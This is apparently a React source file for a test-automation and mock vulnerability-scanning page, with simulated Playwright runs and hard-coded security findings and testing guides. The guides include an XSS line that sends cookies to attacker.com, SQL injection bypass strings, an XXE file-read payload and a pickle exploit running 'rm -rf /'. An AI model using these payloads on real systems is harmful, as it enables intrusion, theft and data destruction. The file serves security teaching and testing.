import { useState, useEffect } from "react";
import { useNavigate, useLocation } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Textarea } from "@/components/ui/textarea";
import { Badge } from "@/components/ui/badge";
import { Progress } from "@/components/ui/progress";
import { Separator } from "@/components/ui/separator";
import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from "@/components/ui/table";
import { Dialog, DialogContent, DialogHeader, DialogTitle } from "@/components/ui/dialog";
import { useToast } from "@/hooks/use-toast";
import { 
  ArrowLeft,
  Play,
  Upload,
  Download,
  Plus,
  Edit,
  Trash2,
  CheckCircle,
  XCircle,
  AlertCircle,
  FileText,
  Image,
  Clock,
  Settings,
  TestTube2,
  Target,
  Globe,
  Shield,
  ShieldAlert,
  Info
} from "lucide-react";

interface LocationState {
  projectId?: string;
  projectName?: string;
}

interface TestCase {
  id: string;
  name: string;
  description: string;
  module: string;
  steps: string[];
  expectedResult: string;
  status: "pending" | "running" | "passed" | "failed";
  lastRun?: string;
  duration?: number;
  screenshot?: string;
  code: string;
}

interface TestModule {
  id: string;
  name: string;
  description: string;
  testCount: number;
}

interface VaptResult {
  id: string;
  vulnerability: string;
  severity: "critical" | "high" | "medium" | "low" | "info";
  description: string;
  affected: string;
  recommendation: string;
  example: string;
  resolutionSteps: string[];
  impact: string;
}

interface VaptScenario {
  id: string;
  title: string;
  description: string;
  severity: "critical" | "high" | "medium" | "low";
  category: string;
  example: string;
  testingSteps: string[];
}

const TestAgent = () => {
  const navigate = useNavigate();
  const location = useLocation();
  const { toast } = useToast();
  const state = location.state as LocationState;
  
  const [activeTab, setActiveTab] = useState("overview");
  const [testCases, setTestCases] = useState<TestCase[]>([]);
  const [modules, setModules] = useState<TestModule[]>([]);
  const [isGenerating, setIsGenerating] = useState(false);
  const [isExecuting, setIsExecuting] = useState(false);
  const [progress, setProgress] = useState(0);
  const [selectedModule, setSelectedModule] = useState("");
  const [applicationUrl, setApplicationUrl] = useState("");
  const [credentials, setCredentials] = useState({ username: "", password: "" });
  const [generatedResults, setGeneratedResults] = useState<{modules: TestModule[], testCases: TestCase[]} | null>(null);
  const [viewingTestCase, setViewingTestCase] = useState<TestCase | null>(null);
  const [executingTestId, setExecutingTestId] = useState<string | null>(null);
  const [newTestCase, setNewTestCase] = useState({
    name: "",
    description: "",
    module: "",
    steps: [""],
    expectedResult: "",
    code: `import { test, expect } from '@playwright/test';

test('sample test', async ({ page }) => {
  await page.goto('${applicationUrl || 'https://example.com'}');
  await expect(page).toHaveTitle(/Expected Title/);
});`
  });
  const [vaptUrl, setVaptUrl] = useState("https://your-application.com");
  const [isVaptTesting, setIsVaptTesting] = useState(false);
  const [vaptResults, setVaptResults] = useState<VaptResult[]>([]);
  const [showBestPractices, setShowBestPractices] = useState(false);
  const [viewingVaptResult, setViewingVaptResult] = useState<VaptResult | null>(null);

  // Mock data initialization
  useEffect(() => {
    const mockModules: TestModule[] = [
      { id: "1", name: "User Authentication", description: "Login, logout, and user management tests", testCount: 8 },
      { id: "2", name: "E-Commerce Cart", description: "Shopping cart functionality and checkout process", testCount: 12 },
      { id: "3", name: "Product Management", description: "Product CRUD operations and search functionality", testCount: 15 },
      { id: "4", name: "Payment Processing", description: "Payment gateway integration tests", testCount: 6 }
    ];

    const mockTestCases: TestCase[] = [
      {
        id: "1",
        name: "User Login Success",
        description: "Test successful user login with valid credentials",
        module: "User Authentication",
        steps: [
          "Navigate to login page",
          "Enter valid username",
          "Enter valid password",
          "Click login button"
        ],
        expectedResult: "User should be redirected to dashboard",
        status: "passed",
        lastRun: "2024-01-20 14:30",
        duration: 2.5,
        screenshot: "login-success.png",
        code: `import { test, expect } from '@playwright/test';

test('user login success', async ({ page }) => {
  await page.goto('/login');
  await page.fill('[data-testid="username"]', 'testuser');
  await page.fill('[data-testid="password"]', 'password123');
  await page.click('[data-testid="login-btn"]');
  await expect(page).toHaveURL('/dashboard');
});`
      },
      {
        id: "2",
        name: "Add Product to Cart",
        description: "Test adding a product to shopping cart",
        module: "E-Commerce Cart",
        steps: [
          "Navigate to product page",
          "Select product options",
          "Click add to cart",
          "Verify cart count increases"
        ],
        expectedResult: "Product should be added to cart successfully",
        status: "failed",
        lastRun: "2024-01-20 14:25",
        duration: 3.2,
        screenshot: "cart-error.png",
        code: `import { test, expect } from '@playwright/test';

test('add product to cart', async ({ page }) => {
  await page.goto('/products/1');
  await page.click('[data-testid="add-to-cart"]');
  const cartCount = await page.textContent('[data-testid="cart-count"]');
  expect(parseInt(cartCount || '0')).toBeGreaterThan(0);
});`
      }
    ];

    setModules(mockModules);
    setTestCases(mockTestCases);
  }, []);

  const handleGenerateTests = async () => {
    if (!applicationUrl) {
      toast({
        title: "URL Required",
        description: "Please provide an application URL to generate tests",
        variant: "destructive"
      });
      return;
    }

    setIsGenerating(true);
    setProgress(0);

    // Simulate test generation progress
    const progressInterval = setInterval(() => {
      setProgress(prev => {
        if (prev >= 90) {
          clearInterval(progressInterval);
          return 90;
        }
        return prev + 10;
      });
    }, 500);

    setTimeout(() => {
      clearInterval(progressInterval);
      setProgress(100);
      setIsGenerating(false);
      
      // Generate multiple test cases across different modules
      const generatedModules: TestModule[] = [
        { id: "gen-1", name: "Navigation Tests", description: "Generated navigation and routing tests", testCount: 3 },
        { id: "gen-2", name: "Form Validation", description: "Generated form input and validation tests", testCount: 4 },
        { id: "gen-3", name: "API Integration", description: "Generated API endpoint and data flow tests", testCount: 2 },
        { id: "gen-4", name: "UI Components", description: "Generated component interaction tests", testCount: 5 }
      ];

      const generatedTestCases: TestCase[] = [
        {
          id: `gen-${Date.now()}-1`,
          name: "Navigation Menu Test",
          description: "Test main navigation menu functionality",
          module: "Navigation Tests",
          steps: ["Load homepage", "Check navigation visibility", "Click menu items", "Verify page transitions"],
          expectedResult: "All navigation links should work correctly",
          status: "pending",
          code: `import { test, expect } from '@playwright/test';

test('navigation menu functionality', async ({ page }) => {
  await page.goto('${applicationUrl}');
  const nav = page.locator('nav');
  await expect(nav).toBeVisible();
  
  const menuItems = page.locator('nav a');
  const count = await menuItems.count();
  expect(count).toBeGreaterThan(0);
});`
        },
        {
          id: `gen-${Date.now()}-2`,
          name: "Form Submission Test",
          description: "Test form validation and submission",
          module: "Form Validation",
          steps: ["Navigate to form", "Fill required fields", "Submit form", "Verify success message"],
          expectedResult: "Form should submit successfully with valid data",
          status: "pending",
          code: `import { test, expect } from '@playwright/test';

test('form validation and submission', async ({ page }) => {
  await page.goto('${applicationUrl}/form');
  await page.fill('input[type="email"]', 'test@example.com');
  await page.fill('input[type="text"]', 'Test User');
  await page.click('button[type="submit"]');
  await expect(page.locator('.success-message')).toBeVisible();
});`
        },
        {
          id: `gen-${Date.now()}-3`,
          name: "API Data Loading Test",
          description: "Test API data fetching and display",
          module: "API Integration",
          steps: ["Load data page", "Wait for API response", "Verify data display", "Check loading states"],
          expectedResult: "Data should load and display correctly",
          status: "pending",
          code: `import { test, expect } from '@playwright/test';

test('api data loading', async ({ page }) => {
  await page.goto('${applicationUrl}/data');
  await page.waitForResponse(response => response.url().includes('/api/'));
  const dataItems = page.locator('[data-testid="data-item"]');
  await expect(dataItems.first()).toBeVisible();
});`
        },
        {
          id: `gen-${Date.now()}-4`,
          name: "Responsive Design Test",
          description: "Test responsive layout on different screen sizes",
          module: "UI Components",
          steps: ["Load page on desktop", "Resize to tablet", "Resize to mobile", "Verify layout adapts"],
          expectedResult: "Layout should adapt to different screen sizes",
          status: "pending",
          code: `import { test, expect } from '@playwright/test';

test('responsive design', async ({ page }) => {
  await page.goto('${applicationUrl}');
  
  // Test desktop
  await page.setViewportSize({ width: 1920, height: 1080 });
  await expect(page.locator('header')).toBeVisible();
  
  // Test mobile
  await page.setViewportSize({ width: 375, height: 667 });
  await expect(page.locator('header')).toBeVisible();
});`
        }
      ];

      setGeneratedResults({
        modules: generatedModules,
        testCases: generatedTestCases
      });

      toast({
        title: "Tests Generated Successfully",
        description: `Generated ${generatedTestCases.length} test cases across ${generatedModules.length} modules`
      });
    }, 5000);
  };

  const handleExecuteTests = async () => {
    setIsExecuting(true);
    setProgress(0);

    const progressInterval = setInterval(() => {
      setProgress(prev => {
        if (prev >= 90) {
          clearInterval(progressInterval);
          return 90;
        }
        return prev + 15;
      });
    }, 800);

    setTimeout(() => {
      clearInterval(progressInterval);
      setProgress(100);
      setIsExecuting(false);

      // Update test statuses randomly for demo
      setTestCases(prev => prev.map(test => ({
        ...test,
        status: Math.random() > 0.3 ? "passed" : "failed",
        lastRun: new Date().toLocaleString(),
        duration: Math.round((Math.random() * 5 + 1) * 10) / 10
      })));

      toast({
        title: "Test Execution Complete",
        description: "All test cases have been executed with Playwright"
      });
    }, 6000);
  };

  const handleAddTestStep = () => {
    setNewTestCase(prev => ({
      ...prev,
      steps: [...prev.steps, ""]
    }));
  };

  const handleUpdateTestStep = (index: number, value: string) => {
    setNewTestCase(prev => ({
      ...prev,
      steps: prev.steps.map((step, i) => i === index ? value : step)
    }));
  };

  const handleRemoveTestStep = (index: number) => {
    setNewTestCase(prev => ({
      ...prev,
      steps: prev.steps.filter((_, i) => i !== index)
    }));
  };

  const handleCreateTestCase = () => {
    if (!newTestCase.name || !newTestCase.description) {
      toast({
        title: "Required Fields Missing",
        description: "Please provide test name and description",
        variant: "destructive"
      });
      return;
    }

    const testCase: TestCase = {
      id: Date.now().toString(),
      ...newTestCase,
      status: "pending",
      steps: newTestCase.steps.filter(step => step.trim() !== "")
    };

    setTestCases(prev => [...prev, testCase]);
    setNewTestCase({
      name: "",
      description: "",
      module: "",
      steps: [""],
      expectedResult: "",
      code: `import { test, expect } from '@playwright/test';

test('sample test', async ({ page }) => {
  await page.goto('${applicationUrl || 'https://example.com'}');
  await expect(page).toHaveTitle(/Expected Title/);
});`
    });

    toast({
      title: "Test Case Created",
      description: "New test case has been added successfully"
    });
  };

  const handleViewTestCase = (testCase: TestCase) => {
    setViewingTestCase(testCase);
  };

  const handleExecuteIndividualTest = async (testCaseId: string) => {
    setExecutingTestId(testCaseId);
    
    // Simulate individual test execution
    setTimeout(() => {
      const isSuccess = Math.random() > 0.3; // 70% success rate for demo
      setExecutingTestId(null);
      
      if (generatedResults) {
        setGeneratedResults(prev => ({
          ...prev!,
          testCases: prev!.testCases.map(tc => 
            tc.id === testCaseId 
              ? { 
                  ...tc, 
                  status: isSuccess ? "passed" : "failed",
                  lastRun: new Date().toLocaleString(),
                  duration: Math.round((Math.random() * 5 + 1) * 10) / 10
                }
              : tc
          )
        }));
      }
      
      toast({
        title: isSuccess ? "Test Passed" : "Test Failed",
        description: isSuccess 
          ? "Individual test case executed successfully"
          : "Test case failed during execution",
        variant: isSuccess ? "default" : "destructive"
      });
    }, 3000);
  };

  const handleAddGeneratedTests = () => {
    if (generatedResults) {
      setTestCases(prev => [...prev, ...generatedResults.testCases]);
      setModules(prev => [...prev, ...generatedResults.modules]);
      setGeneratedResults(null);
      
      toast({
        title: "Tests Added",
        description: "Generated test cases have been added to your test suite"
      });
    }
  };

  const handleExecuteSingleTest = async () => {
    if (!newTestCase.name || !newTestCase.code) {
      toast({
        title: "Cannot Execute",
        description: "Please provide test name and code before execution",
        variant: "destructive"
      });
      return;
    }

    setIsExecuting(true);
    
    // Simulate test execution
    setTimeout(() => {
      const isSuccess = Math.random() > 0.3; // 70% success rate for demo
      setIsExecuting(false);
      
      toast({
        title: isSuccess ? "Test Execution Successful" : "Test Execution Failed",
        description: isSuccess 
          ? "Test case executed successfully with Playwright"
          : "Test case failed during execution. Check the test code and try again.",
        variant: isSuccess ? "default" : "destructive"
      });
    }, 3000);
  };

  const handleSaveTestCase = () => {
    if (!newTestCase.name || !newTestCase.description || !newTestCase.module) {
      toast({
        title: "Required Fields Missing",
        description: "Please provide test name, description, and module name",
        variant: "destructive"
      });
      return;
    }

    const testCase: TestCase = {
      id: Date.now().toString(),
      ...newTestCase,
      status: "pending",
      steps: newTestCase.steps.filter(step => step.trim() !== "")
    };

    setTestCases(prev => [...prev, testCase]);
    
    toast({
      title: "Test Case Saved",
      description: `Test case saved to module: ${newTestCase.module}`,
    });
  };

  const getStatusIcon = (status: TestCase["status"]) => {
    switch (status) {
      case "passed": return <CheckCircle className="h-4 w-4 text-success" />;
      case "failed": return <XCircle className="h-4 w-4 text-destructive" />;
      case "running": return <Clock className="h-4 w-4 text-warning animate-spin" />;
      default: return <AlertCircle className="h-4 w-4 text-muted-foreground" />;
    }
  };

  const getStatusColor = (status: TestCase["status"]) => {
    switch (status) {
      case "passed": return "bg-success/10 text-success border-success/20";
      case "failed": return "bg-destructive/10 text-destructive border-destructive/20";
      case "running": return "bg-warning/10 text-warning border-warning/20";
      default: return "bg-muted/10 text-muted-foreground border-muted/20";
    }
  };

  const handleVaptTest = async () => {
    if (!vaptUrl) {
      toast({
        title: "URL Required",
        description: "Please provide an application URL for VAPT testing",
        variant: "destructive"
      });
      return;
    }

    setIsVaptTesting(true);
    setProgress(0);

    const progressInterval = setInterval(() => {
      setProgress(prev => {
        if (prev >= 90) {
          clearInterval(progressInterval);
          return 90;
        }
        return prev + 10;
      });
    }, 600);

    setTimeout(() => {
      clearInterval(progressInterval);
      setProgress(100);
      setIsVaptTesting(false);

      // Generate mock VAPT results
      const mockResults: VaptResult[] = [
        {
          id: "1",
          vulnerability: "SQL Injection",
          severity: "critical",
          description: "Application is vulnerable to SQL injection attacks in the login form. Attackers can bypass authentication and access unauthorized data.",
          affected: "/api/auth/login, /api/search",
          recommendation: "Use parameterized queries and input validation",
          example: "Payload tested: admin' OR '1'='1' --\n\nVulnerable code:\nconst query = \"SELECT * FROM users WHERE username='\" + username + \"' AND password='\" + password + \"'\";\n\nThis allows attackers to inject SQL:\nUsername: admin' OR '1'='1' --\nPassword: anything\nResult: Bypasses authentication!\n\nSecure implementation:\nconst query = \"SELECT * FROM users WHERE username=? AND password=?\";\npreparedStatement.setString(1, username);\npreparedStatement.setString(2, hashedPassword);",
          resolutionSteps: [
            "Replace all string concatenation in SQL queries with parameterized queries",
            "Implement input validation using whitelists for expected characters",
            "Use ORM frameworks that automatically handle parameterization",
            "Apply principle of least privilege to database accounts",
            "Enable database query logging and monitoring for suspicious patterns",
            "Implement Web Application Firewall (WAF) rules to detect SQL injection attempts"
          ],
          impact: "Attackers can read, modify, or delete sensitive database information. Complete database compromise possible including user credentials, financial data, and business-critical information."
        },
        {
          id: "2",
          vulnerability: "Cross-Site Scripting (XSS)",
          severity: "high",
          description: "User input is not properly sanitized in search results and comment sections, allowing stored and reflected XSS attacks.",
          affected: "/search, /comments, /profile pages",
          recommendation: "Implement Content Security Policy and encode all user inputs",
          example: "Attack payload found:\n<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>\n\nVulnerable code:\n<div>Search results for: <%= userInput %></div>\n\nThis renders malicious scripts directly. When user searches for:\n<img src=x onerror=alert(document.cookie)>\n\nThe script executes and can:\n- Steal session cookies\n- Redirect to phishing sites\n- Modify page content\n- Perform actions as the victim\n\nSecure implementation:\nimport DOMPurify from 'dompurify';\nconst clean = DOMPurify.sanitize(userInput);\n// Or use framework auto-escaping:\n<div>Search results for: {userInput}</div> (React auto-escapes)",
          resolutionSteps: [
            "Implement Content-Security-Policy header with strict directives",
            "HTML encode all user inputs: < becomes &lt;, > becomes &gt;",
            "Use modern frameworks (React, Vue) that auto-escape by default",
            "Sanitize HTML input using libraries like DOMPurify",
            "Validate input on server-side, not just client-side",
            "Set HttpOnly flag on cookies to prevent JavaScript access",
            "Implement output encoding based on context (HTML, JavaScript, CSS, URL)"
          ],
          impact: "Attackers can execute malicious JavaScript in victim browsers, leading to session hijacking, credential theft, malware distribution, and website defacement."
        },
        {
          id: "3",
          vulnerability: "Insecure Direct Object Reference (IDOR)",
          severity: "high",
          description: "Users can access unauthorized resources by manipulating URL parameters and IDs without proper authorization checks.",
          affected: "/api/users/:id, /api/orders/:orderId, /api/documents/:docId",
          recommendation: "Implement proper authorization checks for all resource access",
          example: "Vulnerability demonstration:\n\nUser A (ID: 123) is logged in\nGET /api/users/123/profile → Works ✓\n\nUser A changes URL to:\nGET /api/users/456/profile → Also works! ✗\n\nUser A can now see User B's private profile, orders, and documents.\n\nVulnerable code:\napp.get('/api/orders/:orderId', (req, res) => {\n  const order = db.getOrder(req.params.orderId);\n  res.json(order); // No authorization check!\n});\n\nSecure implementation:\napp.get('/api/orders/:orderId', authenticate, (req, res) => {\n  const order = db.getOrder(req.params.orderId);\n  if (order.userId !== req.user.id && !req.user.isAdmin) {\n    return res.status(403).json({ error: 'Unauthorized' });\n  }\n  res.json(order);\n});",
          resolutionSteps: [
            "Implement authorization checks on every resource access",
            "Use indirect references: map user-specific IDs to internal IDs",
            "Validate that the authenticated user owns the requested resource",
            "Implement Role-Based Access Control (RBAC)",
            "Log and alert on authorization failures",
            "Use framework-level middleware for consistent authorization",
            "Never trust client-supplied IDs without verification"
          ],
          impact: "Unauthorized access to sensitive user data including personal information, financial records, private documents, and business data. Privacy violation and potential data theft."
        },
        {
          id: "4",
          vulnerability: "Missing Security Headers",
          severity: "medium",
          description: "Critical security headers are not configured, leaving the application vulnerable to various attacks.",
          affected: "All endpoints and pages",
          recommendation: "Add X-Frame-Options, X-Content-Type-Options, and Strict-Transport-Security headers",
          example: "Current response headers:\nHTTP/1.1 200 OK\nContent-Type: text/html\n\nMissing headers:\n❌ X-Frame-Options (allows clickjacking)\n❌ X-Content-Type-Options (allows MIME sniffing)\n❌ Strict-Transport-Security (no HTTPS enforcement)\n❌ Content-Security-Policy (no XSS protection)\n❌ X-XSS-Protection (legacy but still useful)\n❌ Referrer-Policy (information leakage)\n\nSecure headers configuration:\nX-Frame-Options: DENY\nX-Content-Type-Options: nosniff\nStrict-Transport-Security: max-age=31536000; includeSubDomains\nContent-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'\nX-XSS-Protection: 1; mode=block\nReferrer-Policy: strict-origin-when-cross-origin\nPermissions-Policy: geolocation=(), microphone=(), camera=()",
          resolutionSteps: [
            "Configure security headers in web server (Nginx/Apache) or application middleware",
            "Set X-Frame-Options: DENY or SAMEORIGIN to prevent clickjacking",
            "Add X-Content-Type-Options: nosniff to prevent MIME type sniffing",
            "Enable HSTS: Strict-Transport-Security with long max-age",
            "Implement comprehensive Content-Security-Policy",
            "Use security header testing tools like securityheaders.com",
            "Test headers in all environments (dev, staging, production)"
          ],
          impact: "Increased vulnerability to clickjacking, MIME sniffing attacks, XSS, and man-in-the-middle attacks. Reduced defense-in-depth protection."
        },
        {
          id: "5",
          vulnerability: "Weak Password Policy",
          severity: "medium",
          description: "Password requirements are insufficient, allowing users to create easily guessable passwords.",
          affected: "/register, /change-password",
          recommendation: "Enforce minimum 12 characters with complexity requirements",
          example: "Current weak policy allows:\n- 'password123' ✓ (common password)\n- '12345678' ✓ (sequential numbers)\n- 'qwerty' ✓ (keyboard pattern)\n- 'admin' ✓ (too short)\n\nThese can be cracked in seconds!\n\nAttack simulation:\nBrute force rate: 1 billion attempts/second (GPU)\nPassword 'password': Cracked in 0.000001 seconds\nPassword 'P@ssw0rd': Cracked in 2 minutes\nPassword 'MyC0mpl3x!P@ssw0rd2024': Would take centuries\n\nSecure password policy:\nif (password.length < 12) return 'Too short';\nif (!/[A-Z]/.test(password)) return 'Need uppercase';\nif (!/[a-z]/.test(password)) return 'Need lowercase';\nif (!/[0-9]/.test(password)) return 'Need number';\nif (!/[!@#$%^&*]/.test(password)) return 'Need special char';\nif (commonPasswords.includes(password)) return 'Too common';",
          resolutionSteps: [
            "Enforce minimum 12-character password length",
            "Require mix of uppercase, lowercase, numbers, and special characters",
            "Check against common password databases (Have I Been Pwned API)",
            "Implement password strength meter on registration page",
            "Enforce password expiration policy (90-180 days)",
            "Prevent password reuse (store last 5 password hashes)",
            "Implement account lockout after 5 failed attempts",
            "Use bcrypt or Argon2 for password hashing with high cost factor"
          ],
          impact: "User accounts vulnerable to brute force and dictionary attacks. Compromised accounts can lead to unauthorized access, data theft, and system abuse."
        },
        {
          id: "6",
          vulnerability: "Information Disclosure",
          severity: "low",
          description: "Server version and technology stack information exposed in response headers and error pages.",
          affected: "All endpoints",
          recommendation: "Remove or obfuscate server version headers and error details",
          example: "Exposed information:\n\nHTTP Headers:\nServer: Apache/2.4.41 (Ubuntu)\nX-Powered-By: PHP/7.4.3\n\nError page reveals:\n\"MySQL Error: Table 'users' doesn't exist at /var/www/app/auth.php line 45\"\n\nAttackers now know:\n- Server: Apache 2.4.41 (check for vulnerabilities)\n- OS: Ubuntu\n- Language: PHP 7.4.3 (has known CVEs)\n- Database: MySQL\n- File structure: /var/www/app/\n- Database table names\n\nWith this info, attackers can:\n1. Search for specific exploits\n2. Craft targeted attacks\n3. Map application structure\n\nSecure configuration:\nHTTP Headers:\nServer: (removed)\nX-Powered-By: (removed)\n\nError page:\n\"An error occurred. Please contact support with reference ID: ERR-2024-001\"\n(Actual error logged internally)",
          resolutionSteps: [
            "Remove Server header from all responses",
            "Disable X-Powered-By header (PHP, Express, etc.)",
            "Implement custom error pages without stack traces",
            "Log detailed errors server-side, show generic messages to users",
            "Disable directory listing on web server",
            "Remove version numbers from public-facing assets",
            "Use security.txt file to provide security contact info only"
          ],
          impact: "Provides attackers with reconnaissance information that aids in crafting targeted attacks. While not directly exploitable, it significantly reduces attack complexity."
        },
        {
          id: "7",
          vulnerability: "Outdated TLS Configuration",
          severity: "info",
          description: "Application supports outdated TLS 1.0 and 1.1 protocols which have known vulnerabilities.",
          affected: "All HTTPS endpoints",
          recommendation: "Disable TLS 1.0 and 1.1, support only TLS 1.2 and above with strong cipher suites",
          example: "Current SSL/TLS configuration:\n✓ TLS 1.3 (Excellent)\n✓ TLS 1.2 (Good)\n⚠️ TLS 1.1 (Deprecated - VULNERABLE)\n⚠️ TLS 1.0 (Deprecated - VULNERABLE)\n✗ SSLv3 (Disabled - Good)\n\nVulnerabilities in TLS 1.0/1.1:\n- BEAST attack\n- POODLE attack\n- No support for modern ciphers\n\nWeak ciphers found:\n- TLS_RSA_WITH_RC4_128_MD5\n- TLS_RSA_WITH_3DES_EDE_CBC_SHA\n\nRecommended configuration (Nginx):\nssl_protocols TLSv1.2 TLSv1.3;\nssl_ciphers 'ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256';\nssl_prefer_server_ciphers on;\n\nTest command:\nnmap --script ssl-enum-ciphers -p 443 yourdomain.com",
          resolutionSteps: [
            "Disable TLS 1.0 and TLS 1.1 in web server configuration",
            "Enable only TLS 1.2 and TLS 1.3",
            "Configure strong cipher suites (forward secrecy)",
            "Disable weak ciphers (RC4, 3DES, MD5)",
            "Enable HSTS to force HTTPS connections",
            "Use tools like SSL Labs to test configuration",
            "Update certificates to use 2048-bit RSA or ECDSA keys",
            "Implement OCSP stapling for certificate validation"
          ],
          impact: "Connections vulnerable to downgrade attacks and cryptographic weaknesses. Potential for man-in-the-middle attacks on older clients."
        }
      ];

      setVaptResults(mockResults);

      toast({
        title: "VAPT Scan Complete",
        description: `Found ${mockResults.length} security findings`
      });
    }, 6000);
  };

  const vaptBestPractices: VaptScenario[] = [
    {
      id: "1",
      title: "SQL Injection Testing",
      description: "Test all input fields with SQL injection payloads to verify proper input sanitization and parameterized queries are used.",
      severity: "critical",
      category: "Injection",
      example: "Input: admin' OR '1'='1' --\nResult: Should NOT bypass authentication or expose database errors.\n\nVulnerable Code:\nSELECT * FROM users WHERE username = '<user_input>'\n\nSecure Code:\npreparedStatement.setString(1, userInput);",
      testingSteps: [
        "Identify all input fields (login forms, search boxes, URL parameters)",
        "Inject SQL metacharacters: ' \" ; -- /* */",
        "Try union-based injection: ' UNION SELECT NULL--",
        "Test for error-based injection to reveal database structure",
        "Attempt time-based blind injection: ' OR SLEEP(5)--"
      ]
    },
    {
      id: "2",
      title: "Cross-Site Scripting (XSS)",
      description: "Verify that user inputs are properly encoded and sanitized to prevent XSS attacks in all contexts (HTML, JavaScript, CSS).",
      severity: "critical",
      category: "Injection",
      example: "Reflected XSS: <script>alert('XSS')</script>\nStored XSS: <img src=x onerror=alert('XSS')>\nDOM XSS: javascript:alert(document.cookie)\n\nSecure Implementation:\n- Use Content Security Policy (CSP)\n- HTML encode: &lt;script&gt; → &lt;script&gt;\n- Use secure frameworks like React that auto-escape",
      testingSteps: [
        "Test all input fields with: <script>alert('XSS')</script>",
        "Try event handlers: <img src=x onerror=alert(1)>",
        "Test URL parameters: ?name=<script>alert(1)</script>",
        "Check stored XSS in comments, profiles, messages",
        "Verify CSP headers are configured properly"
      ]
    },
    {
      id: "3",
      title: "Authentication Bypass",
      description: "Test for weak authentication mechanisms, default credentials, and session management vulnerabilities that could allow unauthorized access.",
      severity: "critical",
      category: "Authentication",
      example: "Common bypass attempts:\n- SQL injection in login: admin' --\n- Password reset token prediction\n- Missing authentication checks on API endpoints\n- JWT token manipulation\n\nTest Case:\nPOST /api/admin/users without authentication\nExpected: 401 Unauthorized\nVulnerable: 200 OK with user data",
      testingSteps: [
        "Test default credentials: admin/admin, admin/password",
        "Try SQL injection in login form",
        "Access authenticated pages without logging in",
        "Test password reset mechanism for flaws",
        "Verify multi-factor authentication cannot be bypassed"
      ]
    },
    {
      id: "4",
      title: "Broken Access Control",
      description: "Verify that users cannot access unauthorized resources, escalate privileges, or perform actions beyond their permission level.",
      severity: "critical",
      category: "Authorization",
      example: "IDOR (Insecure Direct Object Reference):\nGET /api/users/123/profile (normal user)\nGET /api/users/456/profile (should fail but returns data)\n\nPrivilege Escalation:\nPOST /api/admin/delete-user\n{\"userId\": \"123\", \"role\": \"admin\"}\nRegular user should not be able to call admin endpoints",
      testingSteps: [
        "Try accessing other users' data by changing IDs in URLs",
        "Attempt to modify user roles or permissions",
        "Test horizontal privilege escalation (user A → user B)",
        "Test vertical privilege escalation (user → admin)",
        "Check if forced browsing to admin pages is possible"
      ]
    },
    {
      id: "5",
      title: "Security Misconfiguration",
      description: "Check for default credentials, unnecessary services, exposed configuration files, and improper error handling that reveals system information.",
      severity: "high",
      category: "Configuration",
      example: "Common misconfigurations:\n- Exposed .git, .env, config.php files\n- Directory listing enabled\n- Default admin panels: /admin, /phpmyadmin\n- Detailed error messages in production\n\nTest:\nGET /.env → Should return 403/404, not file contents\nGET /admin → Should require strong authentication",
      testingSteps: [
        "Check for exposed configuration files: /.git, /.env, /config",
        "Test for directory listing on /uploads, /files",
        "Verify detailed error messages are disabled in production",
        "Check for default admin credentials",
        "Test unnecessary HTTP methods (PUT, DELETE, TRACE)"
      ]
    },
    {
      id: "6",
      title: "Sensitive Data Exposure",
      description: "Ensure sensitive data (passwords, credit cards, PII) is encrypted in transit (TLS) and at rest, with proper key management.",
      severity: "high",
      category: "Data Protection",
      example: "Data exposure risks:\n- Passwords stored in plaintext or weak hashing (MD5)\n- Credit card numbers in logs or URLs\n- Unencrypted HTTP connections\n- Sensitive data in browser cache/localStorage\n\nSecure:\n- Use bcrypt/Argon2 for password hashing\n- TLS 1.2+ for all connections\n- Encrypt database fields with AES-256",
      testingSteps: [
        "Verify all authentication uses HTTPS, not HTTP",
        "Check if sensitive data appears in URLs or logs",
        "Test if passwords are hashed (not encrypted or plaintext)",
        "Verify credit card data is tokenized, not stored",
        "Check browser cache doesn't store sensitive info"
      ]
    },
    {
      id: "7",
      title: "XML External Entities (XXE)",
      description: "Test XML parsers for XXE vulnerabilities that can lead to file disclosure, SSRF, or denial of service.",
      severity: "high",
      category: "Injection",
      example: "XXE Attack Payload:\n<?xml version=\"1.0\"?>\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>\n<userInfo><name>&xxe;</name></userInfo>\n\nThis can read /etc/passwd file if XML parser is vulnerable.\n\nSecure Parsing:\nDisable external entity processing:\nlibxml_disable_entity_loader(true);",
      testingSteps: [
        "Identify XML input points (SOAP, RSS, file uploads)",
        "Submit XXE payload to read local files",
        "Test for SSRF via XXE: <!ENTITY xxe SYSTEM \"http://internal\">",
        "Try XML bomb (billion laughs attack) for DoS",
        "Verify XML parser has external entities disabled"
      ]
    },
    {
      id: "8",
      title: "Insecure Deserialization",
      description: "Verify that deserialization of untrusted data is properly validated to prevent remote code execution.",
      severity: "high",
      category: "Injection",
      example: "Vulnerable deserialization in Python:\nimport pickle\ndata = pickle.loads(user_input)  # DANGEROUS!\n\nAttacker sends malicious serialized object:\nclass Exploit:\n  def __reduce__(self):\n    return (os.system, ('rm -rf /',))\n\nSecure approach:\n- Use JSON instead of pickle/serialize\n- Validate object types before deserialization\n- Sign serialized data with HMAC",
      testingSteps: [
        "Identify deserialization points (cookies, tokens, API requests)",
        "Test with modified serialized objects",
        "Check if object type validation is performed",
        "Verify digital signatures on serialized data",
        "Test for Java deserialization vulnerabilities in base64-encoded data"
      ]
    },
    {
      id: "9",
      title: "Using Components with Known Vulnerabilities",
      description: "Identify and update outdated libraries, frameworks, and dependencies with publicly disclosed vulnerabilities (CVEs).",
      severity: "high",
      category: "Dependencies",
      example: "Example vulnerable dependencies:\n- jQuery < 3.5.0 (XSS vulnerability)\n- Log4j 2.x < 2.17.0 (Remote Code Execution)\n- Spring Framework < 5.3.18 (Spring4Shell RCE)\n\nDetection tools:\n- npm audit / yarn audit\n- OWASP Dependency-Check\n- Snyk, GitHub Dependabot",
      testingSteps: [
        "Run dependency scanning: npm audit, pip-audit",
        "Check for outdated packages: npm outdated",
        "Review security advisories for used components",
        "Test known CVEs against detected versions",
        "Verify automated dependency updates are configured"
      ]
    },
    {
      id: "10",
